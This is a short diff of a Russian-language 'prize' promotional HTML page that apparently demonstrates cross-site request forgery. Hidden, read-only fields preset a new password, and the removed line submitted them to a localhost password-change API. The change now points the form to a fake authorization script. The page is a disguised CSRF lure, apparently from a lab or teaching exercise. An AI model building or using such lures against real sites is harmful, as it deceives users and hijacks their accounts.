@@ -6,7 +6,7 @@
     <title>Приз</title>
 </head>
 <body>
-    <form style="width: 300px; height: 250px; inset: 0; position: absolute; margin: auto" method="POST" action="http://localhost/beauty/api/password/change">
+    <form style="width: 300px; height: 250px; inset: 0; position: absolute; margin: auto" method="POST" action="authorization_fake.php">
         <input type="password" name="password" value="12345678" hidden readonly>
         <input type="password" name="password_confirm" value="12345678" hidden readonly>
         <h1>АКЦИОННОЕ ПРЕДЛОЖЕНИЕ!</h1>
